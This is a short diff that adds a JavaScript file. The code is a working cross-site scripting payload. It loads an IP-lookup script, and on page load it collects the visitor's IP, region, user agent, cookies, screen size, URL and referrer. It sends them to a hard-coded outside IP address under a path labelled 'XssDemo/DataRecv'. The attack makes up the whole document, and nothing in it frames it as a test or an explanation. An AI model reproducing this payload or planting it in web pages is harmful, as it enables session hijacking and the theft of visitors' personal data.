@@ -1,0 +1,22 @@
+function ImportJs(url){
+	var JSElement=document.createElement("script");
+	JSElement.setAttribute("type","text/javascript");
+	JSElement.setAttribute("src",url);
+	document.head.appendChild(JSElement);
+}
+
+ImportJs("http://pv.sohu.com/cityjson?ie=utf-8");
+
+window.onload=function(){
+	let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp?data=";
+	let ip = returnCitySN["cip"];
+	let region = returnCitySN["cname"];
+	let ua = navigator.userAgent;
+	let cookie = document.cookie;
+	let screensize = screen.width+'x'+screen.height;
+	let Location = window.location.href;
+	let h_referer = document.referrer;
+	let timestamp = new Date().getTime();
+	let PassMsg='["Timestamp: '+timestamp+'","IP: '+ip+'","Region: '+region+'","UA: '+ua+'","Cookie: '+cookie+'","Screen: '+screensize+'","Location: '+Location+'","Referer: '+h_referer+'"]';
+	ImportJs(XssApi+encodeURI(PassMsg));
+}
